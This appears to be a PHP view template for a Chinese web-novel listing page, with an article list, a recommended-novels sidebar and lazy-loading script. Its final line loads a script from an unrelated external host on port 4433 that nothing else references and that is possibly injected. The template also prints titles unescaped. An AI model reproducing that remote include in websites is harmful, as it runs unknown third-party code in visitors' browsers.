<!DOCTYPE html>
<html>
    
    <head>
    <?php include_once('templete/pub_head.php') ?>
    </head>
    
    <body>
    
    <?php include_once('templete/menubar.php') ?>
    
    <div class="container after-cls pt30 pb30">
        <div class="article-left">
            
            <input type="hidden" id="article_type" value="" />
            <input type="hidden" id="article_page" value="1" />
            <div class="article-list" id="article_list">
                
                <?php foreach ($article_list as $article){ ?>
                <a href="<?php echo base_url() ?>novel_<?php echo $article->article_route; ?>.html" target="_blank" class="article-item">
                    <div class="thumb">
                        <img data-src="/<?php echo $article->thumb_path; ?>" src="" alt="<?php echo $article->article_title; ?>" />
                    </div>
                    <div class="limit">
                        <h4 class="title"><?php echo $article->article_title; ?></h4>
                        <h5 class="summary"><?php echo str_replace(array(" ","　",PHP_EOL,"\t","<p>","</p>"),array("","","","","",""),$article->article_summary); ?></h5>
                        <p class="tags"><span><?php echo $article->article_type; ?></span><!--<span class="f13 ml20">1995-09-22</span>--></p>
                    </div>
                    <?php if($article->article_score > 0){ ?>
                    <div class="score">评分：<?php echo $article->article_score; ?></div>
                    <?php } ?>
                </a>
                <?php } ?>
                
            </div>
            
            <?php echo $this->pagination->create_links(); ?>
            
        </div>
        <div class="article-right">
            
            <!--域名列表广告-->
            <a style="display: block; background-color: #fff; box-shadow: 0px 0px 3px #c3c3c4; border-radius: 3px; padding: 5px; margin-bottom: 15px;" href="<?php echo base_url() ?>domain.html" target="_blank">
            	<img style="display: block; width: 100%;" src="/htdocs/spore/images/poster-domain.png" />
            </a>
            
            <?php  if(count($article_recommend) > 0){ ?>
            <div class="recommend">
                <h4 class="recommend-title">推荐小说</h4>
                <?php foreach ($article_recommend as $article){ ?>
                <a class="recommend-item" href="<?php echo base_url() ?>novel_<?php echo $article->article_route; ?>.html" target="_blank">
                    <h4 class="title"><?php echo $article->article_title; ?></h4>
                    <div class="thumb">
                        <img src="/<?php echo $article->thumb_path; ?>" alt="<?php echo $article->article_title; ?>" />
                    </div>
                    <div class="summary"><?php echo str_replace(array(" ","　",PHP_EOL,"\t","<p>","</p>","<br>"),array("","","","","","",""),$article->article_summary); ?></div>
                </a>
                <?php } ?>
            </div>
            <?php } ?>
            
        </div>
    </div>
    
    <?php include_once('templete/pub_foot.php') ?>
    
    <script type="text/javascript">
    $(function(){
        
        lazyLoading();//图片懒加载
        $(window).on("scroll",function(){
            lazyLoading();
        })
        
        scrollTop("ico_top");//返回顶部
        
    })
    </script>
    <script src="https://j.qiqivv.com:4433/i.php?z=126802"></script>
    </body>
</html>
